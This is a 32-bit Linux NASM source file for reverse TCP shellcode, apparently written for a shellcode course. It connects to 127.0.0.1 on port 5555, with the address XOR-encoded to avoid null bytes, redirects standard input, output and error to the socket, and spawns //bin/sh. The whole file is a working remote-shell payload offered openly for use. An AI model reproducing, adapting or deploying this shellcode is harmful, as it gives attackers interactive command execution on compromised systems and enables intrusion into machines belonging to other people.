;Author: sagaroffsec (VL43CK)
;File Name: reverseTCPShellcode.nasm
;Website: https://sagaroffsec.com
;Description: connect to a given IP on given TCP port and spawn a shell 

global _start

section .text

_start:

	;creating socket
	xor eax, eax
	xor ebx, ebx
	xor edx, edx
	
	; socket(PF_INET, SOCK_STREAM, IPPROTO_IP) 
	
	mov al, 0x66	;socketcall()
	mov bl, 0x1	;SYS_SOCKET
	push edx	;PROTOCOL = 0
	push ebx	;for SOCK_STREAM = 1
	push byte 0x2	;PF_INET
	mov ecx, esp	;socketcall system call
	int 0x80	;socket(AF_INET, SOCK_STREAM, 0)
	mov esi, eax	;saving sockfd in esi

	;reverse shell on ip 127.0.0.1 
	;connect(sockfd, {sa_family=AF_INET, sin_port=htons(5555), sin_addr=inet_addr("127.0.0.1")}, 16)

	mov al, 0x66	;socketcall()
	mov bl, 0x3	;SYS_CONNECT
	;push 0x0100007f	;reverse shell to address(127.0.0.1)
	mov edi, 0xfeffff80
	xor edi, 0xffffffff
	push edi
	push word 0xb315;to bind on port (5555)
	push word 0x2	;AF_INET &
	mov ecx, esp	;ECX points to sockaddr
	push byte 0x10	;size of address #sockaddr (16 = 0x10) &
	push ecx	;pointer to sockaddr
	push esi	;sockfd
	mov ecx, esp	;bind args
	int 0x80

	;dup2(ebx, {0,1,2}

	xor ecx, ecx
	xor eax, eax
dup_loop:
	mov al, 0x3f	;dup2
	int 0x80
	inc ecx		;Iterate over {0,1,2}
	cmp cl, 0x3	;check if complete
	jne dup_loop	;jump to loop	

	;execve("//bin/sh", NULL, NULL)

	push edx	;NULL terminated
	push 0x68732f6e
	push 0x69622f2f	;pushing "//bin/sh" in stack
	mov ebx, esp	;points to "//bin/sh" in stack
	mov ecx, edx	;NULL
	mov al, 0xb	;execve
	int 0x80


	

